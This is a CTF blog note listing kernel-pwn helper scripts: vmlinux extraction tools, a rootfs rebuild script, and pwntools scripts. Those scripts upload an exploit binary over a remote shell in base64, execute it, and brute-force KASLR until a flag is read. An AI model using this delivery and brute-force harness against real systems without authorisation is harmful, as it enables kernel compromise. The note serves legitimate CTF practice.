---
layout: article
pageview: true
key: 2022-08-24-kernelpwn-scripts
title: KernelPwn 常用脚本收集
author: Ch4rc0al
categories: 
    - Notes
tags: 
    - CTF
    - Pwn
---

<!--more-->
## 本地脚本
### 提取vmlinux工具
**vmlinux-to-elf**

推荐使用

安装
> sudo apt install python3-pip
sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df
sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf

使用
> vmlinux-to-elf ./bzImage ./vmlinux


### 提取vmlinux脚本

该脚本可能在较低版本号的ubuntu环境中可能不能解析出vmlinux

extract-vmlinux
```sh
#!/bin/sh
# SPDX-License-Identifier: GPL-2.0-only
# ----------------------------------------------------------------------
# extract-vmlinux - Extract uncompressed vmlinux from a kernel image
#
# Inspired from extract-ikconfig
# (c) 2009,2010 Dick Streefland <dick@streefland.net>
#
# (c) 2011      Corentin Chary <corentin.chary@gmail.com>
#
# ----------------------------------------------------------------------

check_vmlinux()
{
    # Use readelf to check if it's a valid ELF
    # TODO: find a better to way to check that it's really vmlinux
    #       and not just an elf
    readelf -h $1 > /dev/null 2>&1 || return 1

    cat $1
    exit 0
}

try_decompress()
{
    # The obscure use of the "tr" filter is to work around older versions of
    # "grep" that report the byte offset of the line instead of the pattern.

    # Try to find the header ($1) and decompress from here
    for    pos in `tr "$1\n$2" "\n$2=" < "$img" | grep -abo "^$2"`
    do
        pos=${pos%%:*}
        tail -c+$pos "$img" | $3 > $tmp 2> /dev/null
        check_vmlinux $tmp
    done
}

# Check invocation:
me=${0##*/}
img=$1
if    [ $# -ne 1 -o ! -s "$img" ]
then
    echo "Usage: $me <kernel-image>" >&2
    exit 2
fi

# Prepare temp files:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# That didn't work, so retry after decompression.
try_decompress '\037\213\010' xy    gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy    bunzip2
try_decompress '\135\0\0\0'   xxx   unlzma
try_decompress '\211\114\132' xy    'lzop -d'
try_decompress '\002!L\030'   xxx   'lz4 -d'
try_decompress '(\265/\375'   xxx   unzstd

# Finally check for uncompressed images or objects:
check_vmlinux $img

# Bail out:
echo "$me: Cannot find vmlinux." >&2
```
使用方法
> ./extract-vmlinux ./bzImage > vmlinux



### 重启kernel脚本
```sh
rm ./exp rootfs/exp
musl-gcc exp.c -static -o exp -masm=intel

sleep 3

cp exp rootfs/

cd rootfs

find . | cpio -o --format=newc > ../rootfs.cpio

cd ..

./start.sh
```




## 远程脚本
### 远程上传执行脚本
```python
from pwn import *
import base64

_addr=""
_port=

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote(_addr, _port)
p.sendline()
p.recvuntil("/ $")

count = 0
for i in range(0, len(exp), 0x200):
    p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
    count += 1
    # log.info("count: " + str(count))
for i in range(count):
    p.recvuntil("/ $")

p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
p.sendline("chmod +x /tmp/exploit")
p.sendline("/tmp/exploit")

```
### 远程爆破kaslr脚本
```python
from pwn import *
import base64

_addr=""
_port=

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())


try_count = 1
while True:
    log.info("no." + str(try_count) + " time(s)")
    p = remote(_addr, _port)
    # p=process(["/bin/sh","./restart.sh"]) #修改这里可以变成本地爆破测试
    p.sendline()
    p.recvuntil("/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        # log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil("/ $")
    
    randomization = (try_count % 1024) * 0x100000
    log.info('trying randomization: ' + hex(randomization))

    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline("chmod +x /tmp/exploit")
    p.sendline("/tmp/exploit "+str(randomization))

    if not p.recvuntil(b"Rebooting in 1 seconds..", timeout=20):
        break
    log.warn('failed!')
    try_count += 1
    p.close()

context.log_level = "debug"
p.sendline("cat flag")
p.interactive()
```

在exp内

```c
int main(int argc, char ** argv, char ** envp)
{
    kernel_offset = (argv[1]) ? atoi(argv[1]) : 0;
    kernel_base += kernel_offset;
}
```
